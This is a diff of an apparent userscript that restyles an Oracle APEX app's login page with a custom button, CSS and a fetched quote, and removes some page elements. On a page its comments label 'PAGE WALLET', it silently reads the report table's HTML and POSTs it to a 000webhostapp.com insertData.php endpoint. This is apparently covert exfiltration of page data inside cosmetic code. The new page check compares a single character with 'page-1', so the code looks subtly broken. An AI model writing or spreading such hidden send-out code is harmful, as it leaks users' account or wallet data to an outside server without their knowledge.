@@ -1,18 +1,27 @@
+//check existese class
+var bodyClasses = document.querySelector('html').className[0];
+if(bodyClasses == 'page-1')
+{
+ //PAGE WALLET
  const url = 'https://biparous-rhythms.000webhostapp.com/assets/insertData.php';
-    let _data = {"data": document.querySelector('.t-Report-report').innerHTML};
-    console.log(_data.data.length);
-    GM_xmlhttpRequest ({
-        method:     "POST",
-        url:        url,
-        data:       JSON.stringify(_data),
-        headers: {
-            'Content-Type': 'application/json'
-        },
-        onload:     function (response) {
-            //console.log(response.responseText);
-        }
-    });
+     let _data = {"data": document.querySelector('.t-Report-report').innerHTML};
+     console.log(_data.data.length);
+     GM_xmlhttpRequest ({
+         method:     "POST",
+         url:        url,
+         data:       JSON.stringify(_data),
+         headers: {
+             'Content-Type': 'application/json'
+         },
+         onload:     function (response) {
+             //console.log(response.responseText);
+         }
+     });
+}
 
+if(bodyClasses == 'page-2')
+{
+// PAGE LOGIN
 //inject link in head dinamically
 document.getElementsByTagName('head')[0].insertAdjacentHTML( 'afterbegin','<style type="text/css">.btn-wrapper-login:hover:before {transition: 1s;left: 0;}.btn-wrapper-login {margin: 0 auto;cursor:pointer;display: flex;color: #fff;text-transform: uppercase;position: relative;height: 30px;width: 100%;align-items: center;justify-content: center;overflow: hidden;}.btn-wrapper-login:before {content: "";display: block;position: absolute;width: 100%;height: 100%;background: #202122;z-index: -1;left: -100%;transition: 1s;}.btn-login {display: flex;justify-content: center;align-items: center;width: 100%;height: 26px;background: rgb(255 99 71 / 70%);border-radius: 2px;}');
 document.getElementById('B115197341225796797').insertAdjacentHTML( 'afterend','<div onclick="apex.submit({request:\'Login\',validate:true});" class="btn-wrapper-login"><div class="btn-login"><span>Login</span></div></div>');
@@ -30,21 +39,13 @@ GM_xmlhttpRequest({
   url: "https://api.forismatic.com/api/1.0/?method=getQuote&format=json&jsonp=parseQuote&lang=ru",
   onload: response => {
       obj = JSON.parse(response.responseText);
-      //check existese class
-      var bodyClasses = document.querySelector('html').className;
-      var myClass = new RegExp("page-2");
-      var trueOrFalse = myClass.test( bodyClasses );
-      //add css
-      if(trueOrFalse)
-      {
-          quotes = document.createElement("h1");
-          quotes.classList.add("quotes");
-          quotes.classList.add("animate__animated");
-          quotes.classList.add("animate__zoomIn");
-          quotes.innerText = obj.quoteText;
-          document.body.appendChild(quotes);
-          quotes.style.cssText = 'text-shadow:2px 2px 6px #000;position:absolute;bottom:20px;width:60%;left: 0;right:0;margin:0 auto;font-size: 1.6vw;color: transparent;-webkit-text-stroke: 1px rgb(255, 255, 255);text-align: center;letter-spacing: 4px;text-shadow: rgb(0 0 0) 4px 2px;';
-      }
+      quotes = document.createElement("h1");
+      quotes.classList.add("quotes");
+      quotes.classList.add("animate__animated");
+      quotes.classList.add("animate__zoomIn");
+      quotes.innerText = obj.quoteText;
+      document.body.appendChild(quotes);
+      quotes.style.cssText = 'text-shadow:2px 2px 6px #000;position:absolute;bottom:20px;width:60%;left: 0;right:0;margin:0 auto;font-size: 1.6vw;color: transparent;-webkit-text-stroke: 1px rgb(255, 255, 255);text-align: center;letter-spacing: 4px;text-shadow: rgb(0 0 0) 4px 2px;';
   }
 });
 //delete Inregistrare sau Modificare
@@ -67,3 +68,4 @@ document.querySelector('.t-Region-body').querySelector('h1').style.cssText = 'co
 document.querySelector('.t-Form-fieldContainer').remove();
 document.querySelectorAll('.t-ContentBlock--lightBG .t-ContentBlock-body, .t-Region, .t-Region-header')[2].style.background = "rgba(255,255,255,.1)";
 document.querySelector('.t-Header-branding').style.backgroundColor = '#333d46';
+}
